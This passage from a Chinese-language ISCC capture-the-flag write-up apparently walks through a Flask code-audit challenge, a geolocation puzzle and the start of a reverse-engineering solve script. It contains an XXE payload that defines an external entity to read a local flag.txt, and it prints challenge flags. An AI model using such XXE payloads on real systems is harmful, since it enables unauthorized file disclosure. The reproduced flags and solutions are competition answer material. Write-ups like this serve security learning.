id=\"_621\"></a><strong>这是一道代码审计题</strong></h3>\n<p>/index访问，login改成1</p>\n<p>得到emoji</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\3214b421a5db46aea7d0224f014965b8.png\"/></p>\n<p>base100解码得到</p>\n<p>源码：</p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">geneSign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>control_key<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"You have not access to this page!\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">check_ssrf</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    hostname <span class=\"token operator\">=</span> urlparse<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hostname\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https?://(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+'</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https?://@(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+'</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">raise</span> BaseException<span class=\"token punctuation\">(</span><span class=\"token string\">\"url format error\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span>  re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'https?://@(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+'</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> judge_ip<span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"You not get the right clue!\"</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            ip_address <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>getaddrinfo<span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span><span class=\"token string\">'http'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> is_inner_ipaddress<span class=\"token punctuation\">(</span>ip_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"inner ip address attack\"</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"You not get the right clue!\"</span>\n    <span class=\"token keyword\">except</span> BaseException <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknow error\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ip2long</span><span class=\"token punctuation\">(</span>ip_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">\"!L\"</span><span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>inet_aton<span class=\"token punctuation\">(</span>ip_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">is_inner_ipaddress</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ip <span class=\"token operator\">=</span> ip2long<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ip2long<span class=\"token punctuation\">(</span><span class=\"token string\">'127.0.0.0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span> <span class=\"token operator\">==</span> ip <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span> <span class=\"token keyword\">or</span> ip2long<span class=\"token punctuation\">(</span><span class=\"token string\">'10.0.0.0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span> <span class=\"token operator\">==</span> ip <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span> <span class=\"token keyword\">or</span> ip2long<span class=\"token punctuation\">(</span><span class=\"token string\">'172.16.0.0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">20</span> <span class=\"token operator\">==</span> ip <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">20</span> <span class=\"token keyword\">or</span> ip2long<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.0.0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span> <span class=\"token operator\">==</span> ip <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">16</span> <span class=\"token keyword\">or</span> ip2long<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span> <span class=\"token operator\">==</span> ip <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">24</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">waf1</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    forbidden_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'7'</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> word <span class=\"token keyword\">in</span> forbidden_list<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ip <span class=\"token keyword\">and</span> word<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> word <span class=\"token keyword\">in</span> ip<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">judge_ip</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>waf1<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> Fasle\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        addr <span class=\"token operator\">=</span> addr<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>encoding <span class=\"token operator\">=</span> <span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n        ipp <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>encodestring<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span>\n        ipp <span class=\"token operator\">=</span> ipp<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ip<span class=\"token operator\">==</span>ipp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">global</span> control_key\n            control_key <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n</code></pre>\n<p>目的是要绕过judge_ip并且ip=ipp</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\06dd223600404e5988829a6ed7229f56.png\"/></p>\n<pre><code class=\"prism language-python\">mti3ljaumc4x\n</code></pre>\n<p>将cookie替换</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9c226a3b3f94433e958de122b8e13c31.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\fba863e85ffa4987a29f9308c60c2828.png\"/></p>\n<p>/mti3ljaumc4x请求，可以看到ajax，xml</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\baa71c2885364db3b165e3469b1b1c1d.png\"/></p>\n<p>并且在title处可以看到flag.txt</p>\n<pre><code class=\"prism language-python\"><span class=\"token operator\">&lt;</span>html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>flag<span class=\"token punctuation\">.</span>txt<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n\t<span class=\"token operator\">&lt;</span>meta http<span class=\"token operator\">-</span>equiv<span class=\"token operator\">=</span><span class=\"token string\">\"Content-Type\"</span> content<span class=\"token operator\">=</span><span class=\"token string\">\"text/html; charset=UTF-8\"</span><span class=\"token operator\">&gt;</span>\n <span class=\"token operator\">&lt;</span>script <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">&gt;</span>\nfunction codelogin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\tvar name <span class=\"token operator\">=</span> $<span class=\"token punctuation\">(</span><span class=\"token string\">\"#name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>val<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tvar password <span class=\"token operator\">=</span> $<span class=\"token punctuation\">(</span><span class=\"token string\">\"#password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>val<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token operator\">|</span><span class=\"token operator\">|</span> word <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\talert<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the username and password!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\tvar data <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;user&gt;&lt;name&gt;\"</span> <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> <span class=\"token string\">\"&lt;/name&gt;&lt;password&gt;\"</span> <span class=\"token operator\">+</span> password <span class=\"token operator\">+</span> <span class=\"token string\">\"&lt;/password&gt;&lt;/user&gt;\"</span><span class=\"token punctuation\">;</span>\n    $<span class=\"token punctuation\">.</span>ajax<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{<!-- --></span>\n    \tcontentType<span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/xml;charset=utf-8\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">type</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n        url<span class=\"token punctuation\">:</span> <span class=\"token string\">\"codelogin\"</span><span class=\"token punctuation\">,</span>\n        data<span class=\"token punctuation\">:</span> data<span class=\"token punctuation\">,</span>\n        dataType<span class=\"token punctuation\">:</span> <span class=\"token string\">\"xml\"</span><span class=\"token punctuation\">,</span>\n        anysc<span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        success<span class=\"token punctuation\">:</span> function <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        \tvar code <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>getElementsByTagName<span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>childNodes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nodeValue<span class=\"token punctuation\">;</span>\n        \tvar msg <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>getElementsByTagName<span class=\"token punctuation\">(</span><span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>childNodes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nodeValue<span class=\"token punctuation\">;</span>\n        \t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>code <span class=\"token operator\">==</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        \t\t$<span class=\"token punctuation\">(</span><span class=\"token string\">\".msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span>msg <span class=\"token operator\">+</span> <span class=\"token string\">\" login fail!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \t<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>code <span class=\"token operator\">==</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        \t\t$<span class=\"token punctuation\">(</span><span class=\"token string\">\".msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span>msg <span class=\"token operator\">+</span> <span class=\"token string\">\" login success!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \t<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        \t\t$<span class=\"token punctuation\">(</span><span class=\"token string\">\".msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token string\">\"error:\"</span> <span class=\"token operator\">+</span> msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \t<span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        error<span class=\"token punctuation\">:</span> function <span class=\"token punctuation\">(</span>XMLHttpRequest<span class=\"token punctuation\">,</span>textStatus<span class=\"token punctuation\">,</span>errorThrown<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            $<span class=\"token punctuation\">(</span><span class=\"token string\">\".msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span>errorThrown <span class=\"token operator\">+</span> <span class=\"token string\">':'</span> <span class=\"token operator\">+</span> textStatus<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n\t <span class=\"token operator\">&lt;</span>form<span class=\"token operator\">&gt;</span>\n\t <span class=\"token operator\">&lt;</span>div  <span class=\"token builtin\">id</span><span class=\"token operator\">=</span><span class=\"token string\">\"loginFormMain\"</span><span class=\"token operator\">&gt;</span>\n\t\t <span class=\"token operator\">&lt;</span>table  style<span class=\"token operator\">=</span><span class=\"token string\">\"width:468px;height:262px;background-color: gray;text-align: center;\"</span><span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t  \t <span class=\"token operator\">&lt;</span>th colspan<span class=\"token operator\">=</span><span class=\"token string\">\"2\"</span> align<span class=\"token operator\">=</span><span class=\"token string\">\"center\"</span> <span class=\"token operator\">&gt;</span>登录<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>th<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t      <span class=\"token operator\">&lt;</span>td<span class=\"token operator\">&gt;</span>用户名<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">input</span> <span class=\"token builtin\">id</span><span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span> style<span class=\"token operator\">=</span><span class=\"token string\">\"width: 200px;height: 30px;\"</span>  name<span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>td<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t      <span class=\"token operator\">&lt;</span>td<span class=\"token operator\">&gt;</span>密  码<span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">input</span> <span class=\"token builtin\">id</span><span class=\"token operator\">=</span><span class=\"token string\">\"password\"</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"password\"</span>  style<span class=\"token operator\">=</span><span class=\"token string\">\"width: 200px;height: 30px;\"</span>  name<span class=\"token operator\">=</span><span class=\"token string\">\"password\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>td<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t  <span class=\"token operator\">&lt;</span>tr<span class=\"token operator\">&gt;</span>\n\t\t\t      <span class=\"token operator\">&lt;</span>td align<span class=\"token operator\">=</span><span class=\"token string\">\"center\"</span> <span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">input</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"button\"</span> style<span class=\"token operator\">=</span><span class=\"token string\">\"cursor: pointer;font-style: inherit;\"</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"next\"</span>  value<span class=\"token operator\">=</span><span class=\"token string\">\"login\"</span> οnclick<span class=\"token operator\">=</span><span class=\"token string\">\"javascript:codelogin()\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n\n\t\t\t  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>tr<span class=\"token operator\">&gt;</span>\n\t\t <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>table<span class=\"token operator\">&gt;</span>\n\t <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n\t  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>在codelogin方法中</p>\n<p>定义了请求方式和请求的数据，数据就是data，直接抄下来</p>\n<p>构造一下</p>\n<pre><code class=\"prism language-python\"><span class=\"token operator\">&lt;</span>!DOCTYPE ANY <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span>!ENTITY ki10Moc SYSTEM <span class=\"token string\">\"./flag.txt\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>name<span class=\"token operator\">&gt;</span>\n\t<span class=\"token operator\">&amp;</span>ki10Moc<span class=\"token punctuation\">;</span>\n\t<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>name<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>password<span class=\"token operator\">&gt;</span>password\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\c8e5a82cd42a4dd48aa5b1c4cad5666b.png\"/></p>\n<p>ISCC{jQvb8-aqQxRlOpBVtrX19-0579i8c-ew08Sq0xf}</p>\n<h3><a id=\"2_799\"></a><strong>爱国敬业好青年-2</strong></h3>\n<p>题目一般靠猜，一半靠蒙</p>\n<p>反正就是天安门广场</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-eW9wGG7x-1654502690054)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2554d291-ee6a-4682-b098-6a3625a3c521/Untitled.png)]\" src=\"image\\a0782818652345ffa571bca05abbbf69.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jIUs9CD0-1654502690054)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28ffce98-a9b7-4d96-af6d-1bbb4d1afa7e/Untitled.png)]\" src=\"image\\6d296a0cd43c4f73b496afe60d1b9f13.png\"/></p>\n<p>三个页面 info flag change</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-vMVdQTdb-1654502690055)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/16214e03-19d9-49d9-8471-fc46328efccc/Untitled.png)]\" src=\"image\\3579e67314b84e218b0f7461b9db5ca1.png\"/></p>\n<pre><code class=\"prism language-python\"><span class=\"token number\">116.41021</span>\n<span class=\"token number\">39.92267</span>\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-6DDyefM8-1654502690055)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/684db3fd-3a11-40fe-9dbb-2801b0dbfbcf/Untitled.png)]\" src=\"image\\a752c73aa76f4efa829c6083dd26bebf.png\"/></p>\n<pre><code class=\"prism language-python\"><span class=\"token number\">116</span>°<span class=\"token number\">24</span>′E\n<span class=\"token number\">39</span>°<span class=\"token number\">55</span>'N\n</code></pre>\n<p>但这样得到的并不对</p>\n<p>应该可能是数据有偏差</p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cghisbTT-1654502690056)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7719f57c-7ec6-4f76-a421-d2090e4146da/Untitled.png)]\" src=\"image\\560a500bf60841319b2f8148f17a58a1.png\"/></p>\n<p>经过测试后修改下数据</p>\n<pre><code class=\"prism language-python\"><span class=\"token number\">116</span>°<span class=\"token number\">23</span>′E\n<span class=\"token number\">39</span>°<span class=\"token number\">54</span>'N\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-K2OaDGUu-1654502690056)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5cd24cba-de7a-4399-89ca-fe5bbd5aeb3e/Untitled.png)]\" src=\"image\\3317e031eb764002808d7bca43d44803.png\"/></p>\n<p>ISCC{w179Qxxs_1QvPlNmSzX08vE_a18s_1q1846NO}</p>\n<h1><a id=\"REVERSE_848\"></a><strong>REVERSE</strong></h1>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-O95cAcGG-1654502690057)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd12131a-8f31-4d2d-b2b0-f72402649f22/Untitled.png)]\" src=\"image\\7f09d54e9a474c4fa71a8107aab2d238.png\"/></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Ppv21sEO-1654502690057)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9b1f658-39b3-44e5-8ec1-7cf187400857/Untitled.png)]\" src=\"image\\efcc957b64c044f0b513ab2a3e66bc5c.png\"/></p>\n<p>v4的值付给v3传入sub_4115FF</p>\n<p>之后给sub_411433运算</p>\n<p>exp：</p>\n<pre><code class=\"prism language-python\">str1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">149</span><span class=\"token punctuation\">,</span><span class=\"token number\">169</span><span class=\"token punctuation\">,</span><span class=\"token number\">137</span><span class=\"token punctuation\">,</span><span class=\"token number\">134</span><span class=\"token punctuation\">,</span><span class=\"token number\">212</span><span class=\"token punctuation\">,</span><span class=\"token number\">188</span><span class=\"token punctuation\">,</span><span class=\"token number\">177</span><span class=\"token punctuation\">,</span><span class=\"token number\">184</span><span class=\"token punctuation\">,</span><span class=\"token number\">177</span><span class=\"token punctuation\">,</span><span class=\"token number\">197</span><span class=\"token punctuation\">,</span><span class=\"token number\">192</span><span class=\"token punctuation\">,</span><span class=\"token number\">179</span><span class=\"token punctuation\">,</span><span class=\"token number\">153</span><span class=\"token punctuation\">,</span><span class=\"token number\">172</span><span class=\"token punctuation\">,</span><span class=\"token number\">152</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">164</span><span class=\"token punctuation\">,</span><span class=\"token number\">193</span><span class=\"token punctuation\">,</span><span class=\"token number\">113</span><span class=\"token punctuation\">,</span><span class=\"token number\">184</span><span class=\"token punctuation\">]</span>\nstr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">76</span><span class=\"token punctuation\">,</span><span class=\"token number\">87</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">,</span><span class=\"token number\">70</span><span class=\"token punctuation\">,</span><span class=\"token number\">85</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">78</span><span class=\"token punctuation\">,</span><span class=\"token number\">71</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">74</span><span class=\"token punctuation\">,</span><span class=\"token number\">71</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">70</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">,</span><span class=\"token number\">89</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">,</span><span 